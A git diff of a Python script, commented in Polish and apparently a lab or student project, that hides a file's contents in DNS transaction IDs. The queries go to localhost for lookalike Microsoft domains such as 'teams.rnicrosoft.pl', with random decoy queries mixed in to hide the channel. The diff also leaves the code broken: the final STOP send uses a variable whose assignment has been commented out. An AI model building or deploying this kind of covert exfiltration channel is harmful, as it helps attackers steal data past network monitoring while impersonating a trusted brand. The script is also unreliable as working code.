@@ -5,7 +5,7 @@ from IO_ops import *
 from dnslib import DNSRecord, DNSHeader, DNSQuestion, QTYPE
 
 
-SPECIAL_CHAR = 0x0000
+SPECIAL_CHAR = 0x0000 + 1500
 
 domains = ['teams.rnicrosoft.pl', 'outlook.rnicrosoft.pl', 'onedrive.rnicrosoft.pl']
 
@@ -14,6 +14,12 @@ def mix_two_chars_bits(chunk):
     bits2 = chunk[8:]
     mixed = bits1[:4] + bits2[:4] + bits1[4:6] + bits2[4:6] + bits1[6:8] + bits2[6:8]
     return mixed
+
+def add_offset(base_txid: int) -> int:
+    """Dodaje 1500 jeśli dwa ostatnie bity są parzyste (00 lub 10),
+       w przeciwnym razie 850; wynik obcinamy do 16 bitów."""
+    offset = 1500 if (base_txid & 0b11) % 2 == 0 else 850
+    return (base_txid + offset) & 0xFFFF
 
 def modify_txid_based_on_last_bits(chunk):
     last_two_bits = chunk[-2:]
@@ -67,15 +73,15 @@ def send_dns_query(filepath):
 
     # Ukryte dane
     for part in parts:
-        # Wysłanie znaku specjalnego START
-        start_end_website = random.choice(domains)
-        client.sendto(dns_query(SPECIAL_CHAR, start_end_website).pack(), ('127.0.0.1', 5353))
-        print(f"Sent START TXID: {SPECIAL_CHAR}")
+        # # Wysłanie znaku specjalnego START
+        # start_end_website = random.choice(domains)
+        # client.sendto(dns_query(SPECIAL_CHAR, start_end_website).pack(), ('127.0.0.1', 5353))
+        # print(f"Sent START TXID: {SPECIAL_CHAR}")
 
-        try:
-            response, _ = client.recvfrom(512)
-        except socket.timeout:
-            pass
+        # try:
+        #     response, _ = client.recvfrom(512)
+        # except socket.timeout:
+        #     pass
 
         for i in range(0, len(part), 16):
             selected_website = random.choice(domains)
@@ -83,8 +89,12 @@ def send_dns_query(filepath):
             if len(chunk) < 16:
                 chunk = chunk.ljust(16, '0')  # Dopelnij zerami do 16 bitów
             
+            # chunk = mix_two_chars_bits(chunk)
+            # txid = int(chunk, 2)
+
             chunk = mix_two_chars_bits(chunk)
-            txid = int(chunk, 2)
+            base = int(chunk, 2)
+            txid = add_offset(base)
 
             client.sendto(dns_query(txid, selected_website).pack(), ('127.0.0.1', 5353))
             print(f"Sent TXID: {txid} (chunk: {chunk})")
@@ -94,25 +104,30 @@ def send_dns_query(filepath):
             except socket.timeout:
                 pass
 
-        # Wysłanie znaku specjalnego STOP
-        client.sendto(dns_query(SPECIAL_CHAR, start_end_website).pack(), ('127.0.0.1', 5353))
-        print(f"Sent STOP TXID: {SPECIAL_CHAR}")
 
-        try:
-            response, _ = client.recvfrom(512)
-        except socket.timeout:
-            pass
+
+
 
         # Po każdej części wysyłamy fake messages
         num_fake_messages = random.randint(40, 60)
-        send_fake_message(client, num_fake_messages, start_end_website)
+        send_fake_message(client, num_fake_messages, random.choice(domains))
+        
+        # Wysłanie znaku specjalnego STOP
+    client.sendto(dns_query(SPECIAL_CHAR, start_end_website).pack(), ('127.0.0.1', 5353))
+    print(f"Sent STOP TXID: {SPECIAL_CHAR}")
+    try:
+        response, _ = client.recvfrom(512)
+    except socket.timeout:
+        pass
 
 def send_fake_message(client, num_fake_messages, start_end_website):
     for _ in range(num_fake_messages):
         # FAKE dane wygenerowane jak prawdziwe
         fake_bits = ''.join(random.choice('01') for _ in range(16))
         mixed_bits = mix_two_chars_bits(fake_bits)
-        fake_txid = int(mixed_bits, 2)
+        # fake_txid = int(mixed_bits, 2)
+        base = int(mixed_bits,2)
+        fake_txid = (base + 2200) & 0xFFFF
 
         fake_website = random.choice(domains)
         print(f"Sending FAKE TXID: {fake_txid} (chunk: {mixed_bits})")
